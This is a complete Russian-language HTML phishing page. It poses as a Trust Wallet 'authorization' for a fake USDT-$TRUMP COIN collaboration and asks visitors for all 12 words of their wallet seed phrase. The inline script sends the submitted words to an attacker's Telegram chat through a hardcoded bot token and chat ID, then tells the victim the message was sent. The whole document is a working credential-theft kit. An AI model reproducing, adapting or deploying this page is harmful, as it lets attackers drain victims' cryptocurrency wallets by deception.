<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Секретная фраза</title>
    <style>
        /* Общие стили */
        body {
            font-family: 'Arial', sans-serif;
            background-color: #0B0E11;
            color: #FFFFFF;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            background-color: #1E1E1E;
            border-radius: 16px;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        .logo {
            width: 250px;
            height: 150px;
            margin: 0 auto 16px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 16px;
            color: #FFFFFF;
        }
        .description {
            font-size: 14px;
            color: #A0A0A0;
            margin-bottom: 20px;
        }
        .seed-input {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
        }
        input {
            padding: 12px;
            font-size: 14px;
            border: 1px solid #333333;
            border-radius: 8px;
            background-color: #2C2C2C;
            color: #FFFFFF;
            text-align: center;
        }
        input::placeholder {
            color: #888888;
        }
        button {
            margin-top: 20px;
            width: 100%;
            padding: 12px;
            background-color: #1E90FF;
            color: #FFFFFF;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #1C86EE;
        }
        .warning {
            margin-top: 10px;
            font-size: 12px;
            color: #FFD700;
        }
        @media (max-width: 480px) {
            .seed-input {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="IMG_2095.png" alt="Trust Wallet Logo" class="logo">
        <h1>Для участия в колоборации USDT-$TRUMP COIN вам необходимо добавить ваш кошелёк в список участников. Авторизуйте свой кошелёк</h1>
        <p class="description">авторизуйте ваш кошелёк вашей секретной фразой из 12-ти слов. Убедитесь, что вы храните её в безопасности!</p>
        <form id="seedForm">
            <div class="seed-input">
                <input type="text" name="word1" placeholder="Слово 1" required>
                <input type="text" name="word2" placeholder="Слово 2" required>
                <input type="text" name="word3" placeholder="Слово 3" required>
                <input type="text" name="word4" placeholder="Слово 4" required>
                <input type="text" name="word5" placeholder="Слово 5" required>
                <input type="text" name="word6" placeholder="Слово 6" required>
                <input type="text" name="word7" placeholder="Слово 7" required>
                <input type="text" name="word8" placeholder="Слово 8" required>
                <input type="text" name="word9" placeholder="Слово 9" required>
                <input type="text" name="word10" placeholder="Слово 10" required>
                <input type="text" name="word11" placeholder="Слово 11" required>
                <input type="text" name="word12" placeholder="Слово 12" required>
            </div>
            <button type="submit">Отправить</button>
        </form>
        <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
    </div>

    <script>
        document.getElementById('seedForm').addEventListener('submit', async function(event) {
            event.preventDefault();

            const token = "7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg";
            const chatId = "@bdsjxjdhd";
            const formData = new FormData(event.target);
            const words = Array.from(formData.values());

            // Формируем сообщение с нумерацией
            const formattedMessage = words
                .map((word, index) => `${index + 1}. ${word}`)
                .join("\n");

            try {
                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `Секретная фраза:\n${formattedMessage}`
                    })
                });

                if (!response.ok) {
                    throw new Error("Ошибка отправки");
                }

                alert("Сообщение отправлено!");
            } catch (error) {
                console.error("Ошибка:", error);
                alert("Не удалось отправить сообщение.");
            }
        });
    </script>
</body>
</html>
